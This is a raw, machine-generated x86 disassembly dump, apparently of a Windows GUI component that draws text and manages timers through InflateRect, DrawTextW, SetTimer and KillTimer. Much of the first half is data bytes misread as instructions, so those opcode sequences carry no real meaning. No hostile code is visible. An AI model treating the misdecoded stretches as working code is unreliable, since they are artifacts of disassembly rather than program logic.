add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or ecx [ edi + 0x6e ]
inc ebx
popad
outsb
push edx
jae r-xdata
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
aaa
push esi
inc esp
add [ edi ] dl
add bh bh
mov al 0xde
dec eax
add [ eax ] bl
or [ ecx ] cl
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] 0x0
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
add [ eax ] eax
outsd
outsb
je r-xdata
cmp [ 0x6e4f0e00 ] 0x43
jpe r-xdata
add [ eax + 0x50090031 ] al
outsd
sbb [ fs : esi + 0x44 ] dl
add [ ecx ] bl
add bh bh
pushfd
add [ eax ] al
dec edi
jbe r-xdata
add [ eax + 0x4f0a003f ] al
outsb
adc al 0x42
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0040 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ edx ] cl
dec edi
outsb
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090044 ] al
inc esp
jb r-xdata
loopne r-xdata
push eax
outsd
jo r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax + 0x4f070045 ] al
add [ eax ] 0x0
adc al 0x42
add [ eax ] al
add al [ eax ]
inc [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060046 ] al
outsb
inc ebp
js r-xdata
or [ eax ] 0xf8
add [ eax ] al
inc edi
je r-xdata
adc al 0x42
add al bh
add [ eax ] eax
jo r-xdata
inc ebx
dec edi
outsb
dec eax
add al bl
add [ eax ] al
jo r-xdata
dec eax
test [ eax ] cl
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004f ] al
outsb
dec esp
popad
jbe r-xdata
dec ebx
add [ edi + ecx * 2 ] cl
outsb
cmp al 0x7f
dec eax
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0049 ] al
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
inc esp
imul esi [ ebp + 0x49 ] 0x186f666e
or [ eax ] 0x28
add [ eax ] eax
[ eax ]
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ ecx ] cl
dec edi
or [ eax ] 0xff0000e0
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0e00
or [ eax ] 0xe8
add [ eax ] eax
insd
jb r-xdata
dec edi
outsb
push edx
jae r-xdata
mov ah 0x7f
dec eax
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004c ] al
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
outsd
ja r-xdata
inc esp
inc esp
outsd
arpl [ ebx - 0x78 ] bp
or [ eax ] 0x8
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ eax ] cl
or [ edx ] al
add bh bh
or [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ 0x65476e4f ] cl
je r-xdata
inc esp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ edx ] cl
dec edi
outsb
jo r-xdata
inc esp
outsd
arpl [ ebx + 0x40 ] bp
dec edi
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x70 ] bp
nop
nop
inc esp
push eax
dec eax
add [ ecx ] al
or eax 0x7574614e
jb r-xdata
jpe r-xdata
or [ eax ] 0x0
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0050 ] al
outsb
push ebx
je r-xdata
dec ebp
push ebx
or ecx [ edi + 0x6e ]
outsd
jbe r-xdata
dec ebp
add [ ebx ] al
add [ eax ] al
add [ eax + edx * 2 + 0x72060048 ] bh
jae r-xdata
imul esi [ esp + esi * 2 + 0x65 ] 0x6e614372
push edx
jae r-xdata
jbe r-xdata
jb r-xdata
inc eax
push edi
insb
dec esi
jne r-xdata
add [ eax ] cl
je r-xdata
cmp al 0x7f
dec eax
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004d ] al
add al [ eax ]
add [ eax + 0x6c004894 ] ah
outsd
outsb
push es
jb r-xdata
push es
jpe r-xdata
jb r-xdata
outsb
je r-xdata
je r-xdata
inc esp
jb r-xdata
add [ eax + eax + 0x74 ] 0x82
inc esp
mov al [ 0x6c004894 ]
jpe r-xdata
dec eax
add [ ebx ] al
or al 0x54
push edx
jae r-xdata
push eax
bound esp [ ebp + 0x72 ]
add eax 0x1
or [ eax ] 0x28
add al [ eax ]
[ eax ]
push ebp
jo r-xdata
add [ fs : eax + eax + 0x18 ] 0x9000485f
or [ ecx ] cl
enter 0x48f9 0x0
ror [ ebp + 0x42 ] 0x0
pop eax
dec esp
ror [ eax ] 0x1
test [ eax ] 0x48
add [ eax + eax + 0x64 ] 0x18004481
dec esi
dec eax
add [ esi ] al
inc ebp
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
dec esi
ja r-xdata
pop es
fadd [ bp + di + 0x48 ]
sub [ edx ] al
add bh bh
sub [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ecx
add [ eax ] al
push ebx
je r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
or [ ebp ] 0x9
dec edi
adc al 0x42
add al ch
add [ eax ] al
pop edi
dec eax
add [ eax - 0x37ffb6f8 ] dl
stc
dec eax
add al al
dec ebp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] bl
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ esi + ebx * 2 - 0xf7fffb8 ] dl
dec eax
add [ eax + esi * 8 + 0x48 ] bh
add [ ecx + esi * 8 + 0x48 ] cl
add [ edi + ecx * 8 - 0x2703ffb8 ] bl
dec eax
add [ eax - 0x28 ] ah
dec eax
add [ eax ] cl
jecxz r-xdata
add [ eax - 0x7f ] cl
inc esp
popad
je r-xdata
add [ edi ] eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x7 ] si
jae r-xdata
imul edi [ edx + 0x65 ] 0x746e4907
jb r-xdata
test [ eax + eax + 0x48 ] al
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] dh
arpl [ eax ] cx
add [ ebx + 0x48 ] ah
add [ eax + eax ] al
aad 0xff
aam 0xff
sar edi cl
add ah ah
into
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
pushad
popad
dec eax
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0x64489aa7
fimul [ eax ]
cwde
loope r-xdata
or [ edx + 0x73 ] esi
push eax
popad
je r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84ac5188
dec eax
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
imul ebp [ esi + 0x65 ] 0x55737208
jo r-xdata
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push es
pop esi
dec eax
add [ eax + 0x7c0048f0 ] al
add [ esp + eax * 4 + 0x44 ] ch
add al al
push esp
push ebx
jo r-xdata
add [ eax ] al
dec eax
add ah bl
dec eax
add al ah
into
dec eax
add al bl
or cl [ ecx ]
int3
or [ ecx ] cl
clc
jb r-xdata
and al 0x52
inc esp
add [ esi + edx * 2 + 0x44 ] ch
add [ eax ] bl
push esi
inc esp
add [ eax + 0x50c09090 ] dl
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax + 0x57 ] al
sbb [ esi + 0x44 ] dl
imul esi [ esp + esi * 2 + 0x65 ] 0x48522472
add [ edi ] al
or [ ebx + edx * 2 + 0x70 ] edx
insb
imul esi [ esp + esi * 2 + 0x65 ] 0x48516072
add [ ebp + edx * 4 + 0x1b0048 ] ah
or [ ebp + 0x78 ] al
je r-xdata
inc edx
add [ eax + 0x8 ] bl
dec ecx
add al bh
or [ ebp + 0x78 ] al
je r-xdata
popad
insb
int3
je r-xdata
je r-xdata
jecxz r-xdata
test [ fs : eax + eax + 0x48 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ esi ] 0x0
add [ eax ] al
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x61500b00
jb r-xdata
mov [ ecx + ecx * 2 ] cs
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
push ebx
outsb
popad
jo r-xdata
loope r-xdata
insb
jae r-xdata
ror [ eax ] 0x1
js r-xdata
insb
jae r-xdata
add [ eax ] al
add eax 0x69570500
je r-xdata
outsb
je r-xdata
sbb [ esi + 0x44 ] dl
jb r-xdata
inc edx
jbe r-xdata
add [ edi ] al
add [ ebp - 0x4b00ffff ] ch
push 0x10048
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esi
inc esp
outsb
jae r-xdata
add [ eax - 0x80000000 ] al
adc eax [ eax ]
or eax [ ebx + 0x6f ]
add [ ecx + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add [ 0x12ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add al dl
jno r-xdata
outsb
je r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
push ecx
dec eax
add [ esi ] dl
push edx
dec eax
add [ edx + eax ] cl
nop
nop
pushad
push ecx
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 2 ] ah
outsb
je r-xdata
pop esp
push eax
dec eax
add al dh
add [ eax ] eax
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x6c656c62
push esi
inc esp
add [ eax ] cl
add bh bh
clc
aad 0x48
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ esi ] dl
add [ ebx ] cl
push edx
jae r-xdata
imul ebp [ esi + 0x74 ] 0x48504073
add al cl
sbb [ esi + 0x44 ] dl
add [ ecx + eax + 0x1acff00 ] ch
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
or [ ecx + 0x75 ] al
outsb
jno r-xdata
adc [ eax ] eax
pop es
mov ah 0x68
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ ebx ] bl
add bh bh
pushad
ror [ eax ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
js r-xdata
jb r-xdata
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0018 ] al
outsb
inc ebx
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
[ eax ] eax
nop
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_46dc10
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_46e404
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_46dc10
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_46e404
pop ebx
mov esp ebp
pop ebp
retn
jpe r-xdata
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
push eax
dec eax
add al ch
add [ eax ] eax
push edx
jae r-xdata
jpe r-xdata
adc al 0x0
pop es
dec ebp
imul ebp [ esi + 0x53 ] 0x18657a69
push esi
inc esp
add [ edx ] bl
add bh bh
je r-xdata
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1e ] al
add [ eax ] bh
add bh bh
mov esp 0x10048e1
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor dl 0xff
push esp
inc ebx
inc ebx
or al 0x89
inc ebp
hlt
popad
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070019 ] al
outsb
dec ebp
outsd
jbe r-xdata
add [ edi ] dl
add bh bh
mov al 0xde
dec eax
add [ eax ] bl
or [ ecx ] cl
add [ eax ] al
add [ eax + 0x1 ] al
pop ss
insb
sbb [ gs : esi + 0x44 ] dl
hlt
sub_48542c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_46dc10
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_46e404
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_46dc10
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_46e404
pop ebx
mov esp ebp
pop ebp
retn
sub_4854f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_46dd2c
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_48542c
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_485550
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42e278
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_4855d4
call sub_42f400
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4855a0
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax [ esi + 0x34 ]
call sub_42f4b4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42e2c4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_4855d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcW
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push j_sub_4488a4#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4483f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_485648
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4856c7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4856ce
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
sub_485720
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_498aa8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
add esp 0xfffffff0
call sub_448694
mov edx 0xb9
mov eax esi
call sub_48d5f8
mov edx 0x29
mov eax esi
call sub_48d62c
mov [ esi + 0x268 ] 0x2
mov [ esi + 0x279 ] 0x2
mov dl 0x2
mov eax esi
call sub_485bec
mov edx 0x1
mov eax esi
call sub_485c08
mov [ esi + 0x274 ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_48e120
mov [ esi + 0x275 ] 0x1
mov dl 0x1
mov eax esi
call sub_496ba4
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov [ esi + 0x278 ] 0x1
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_485800
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4926c0
movzx eax [ ebx + 0x274 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1e1 ] 0x0
je r-xdata
cmp [ ebx + 0x274 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_485878
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_495d94
pop esi
pop ebx
retn
cmp [ ebx + 0x274 ] 0x1
jne r-xdata
mov eax ebx
call sub_492ec4
sub_4858b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4859b8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x275 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
cmp [ ebx + 0x278 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_494928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4859bf
lea eax [ ebp - 0x14 ]
call j_sub_449348
retn
mov esi [ ebx + 0x270 ]
cmp [ ebx + 0x26a ] 0x0
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_48df68
cmp [ ebp - 0x14 ] 0x0
je r-xdata
cmp [ ebx + 0x26b ] 0x0
je r-xdata
mov eax [ ebx + 0x26c ]
add esi eax
test esi esi
jle r-xdata
mov eax [ ebx + 0x26c ]
add esi eax
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_496868
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_496868
push eax
call InvalidateRect
sub_4859c8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_485a00
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_485ba8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
movzx eax [ ebx + 0x26b ]
test al al
je r-xdata
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
push ebp
call sub_4859c8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x26c ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x260 ]
call sub_4854f0
mov eax [ ebx + 0x6c ]
push eax
mov edx [ ebx + 0x270 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x260 ]
call sub_4854f0
jmp r-xdata
test [ ebx + 0x52 ] 0x4
jne r-xdata
movzx eax [ ebx + 0x26a ]
test al al
je r-xdata
mov eax [ ebx + 0x270 ]
neg eax
push eax
mov edx [ ebx + 0x270 ]
neg edx
push eax
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov esi [ ebx + 0x260 ]
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
push ebp
call sub_4859c8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x26c ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x260 ]
call sub_4854f0
mov edx [ ebx + 0x6c ]
mov eax [ esi + 0x14 ]
call sub_46df1c
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_46e300
mov eax ebx
call sub_497d00
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485baf
lea eax [ ebp - 0x20 ]
mov edx 0x2
call j_sub_44936c
retn
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_48df68
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x278 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_46e058
mov edx [ ebx + 0x64 ]
mov eax esi
call sub_46e7e4
movzx eax [ ebx + 0x279 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x60
movzx eax [ ebx + 0x268 ]
or edi [ eax * 4 + rw-data ]
mov edx edi
mov eax ebx
call sub_490a7c
mov edi eax
mov eax esi
call sub_46e8c8
mov esi eax
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_48df68
mov ebx [ ebp - 0x20 ]
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x24 ]
call sub_449db8
push eax
push esi
call DrawTextW
sub_485c7c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4912a8
mov eax [ ebx + 0x270 ]
neg eax
push eax
mov edx [ ebx + 0x270 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x26b ] 0x0
je r-xdata
cmp [ ebx + 0x26a ] 0x0
je r-xdata
mov edx [ ebx + 0x26c ]
add eax edx
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
mov edx [ ebx + 0x26c ]
add eax edx
sub_485cd8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_49532c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x269 ] 0x1
xor edx edx
push ebp
push sub_485dfa
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x4c ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
